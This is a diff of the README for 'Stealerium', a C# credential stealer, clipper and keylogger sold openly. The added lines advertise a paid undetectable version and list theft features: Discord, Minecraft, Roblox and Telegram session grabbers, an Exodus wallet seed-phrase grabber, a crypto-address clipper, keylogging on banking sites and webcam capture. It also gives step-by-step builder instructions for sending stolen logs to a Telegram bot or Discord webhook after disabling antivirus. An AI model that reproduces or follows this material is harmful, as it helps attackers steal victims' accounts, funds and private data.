@@ -1,9 +1,11 @@
 
-     conntact me - https://t.me/stealeriumV2
-
+     
 ![image](https://github.com/user-attachments/assets/d7dfc704-3c55-40b3-afb5-426fddd86e95)
 
-A Stealer written in C#, designed to send logs to your Telegram bot.
+  contact me - https://t.me/stealeriumV2 to buy premium or if you need help
+prem - FUD mac and windows availabilty and more features
+
+A Stealer written in C#, designed to send logs to your Telegram bot and or discord webhook.
 Stealer + Clipper + Keylogger
 
 
@@ -64,16 +66,7 @@ Process List
  Autorun Module
 
 
-
-
-
-
-
-
---------------------------------------------------------------------------------------------------------------------------------
-🎹 Keylogger: Activates when the user types in chat or accesses a banking website.
-📋 Clipper: Engages and alters crypto wallet addresses in the clipboard during transactions.
-📷 Webcam Screenshots: Captured if the user views inappropriate content online.
+--------------------------------------------------------------------------------------------------------------------
 🔨 Builder
 Temporarly disable your Antivirus
 Download Stealerium.zip from https://github.com/Stealerium/Stealerium/releases and extract the zip content to a deseired folder.
@@ -81,27 +74,52 @@ Run BuilderGUI.exe
 Go to the @BotFather bot and create your own bot. You need to save token and bot name.
 Now you need to get your chat id. To do this, go to the next bot @chatid_echo_bot and save the id.
 Insert this data in BuilderGUI
-Configure desired options 
+Configure desired options
 Hit Build and enjoy!
-BuilderGUI
+
+![image](https://github.com/user-attachments/assets/993ef19d-10a2-4df2-89d5-b62279bb4e04)
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------
+Features
+discord grabber + auto buy nitro and claim to your set account
+minecraft grabber
+roblox grabber
+Exodus seed/phrase grabber
+telegram session logger
+🎹 Keylogger: Activates when the user types in chat or accesses a banking website.
+📋 Clipper: Engages and alters crypto wallet addresses in the clipboard during transactions.
+📷 Webcam Screenshots: Captured if the user views inappropriate content online.
+much much more and more coming soon.
+------------------------------------------------------------------------------------------------------
+
 📢 Channel Webhook
+set webook through builder for telegram or discord your choice!
+
+![image](https://github.com/user-attachments/assets/e6ad23ab-add3-4931-85bb-cb7e444be4af)
 
 -------------------------------------------------------------------------------------------------------------------------------
 Requirements
 To build from source, you'll need:
-
+============================================
 Visual Studio 2022 (v17.*)
+https://visualstudio.microsoft.com/vs/
+
 .NET SDK 6.0.* (included with Visual Studio 2022)
+https://dotnet.microsoft.com/en-us/download/dotnet/6.0
+
 .NET Framework SDK 4.8 (included with Visual Studio 2022)
+https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48
+-------------------------------------------------------------------
 Runtime Requirements
 Required if you download the release from Releases:
 
 Builder.exe (.NET Runtime 6.0.*)
+https://dotnet.microsoft.com/en-us/download/dotnet/6.0
+
 Stub (.NET Framework 4.8)
-
-
-
-
+https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48
 
 
 
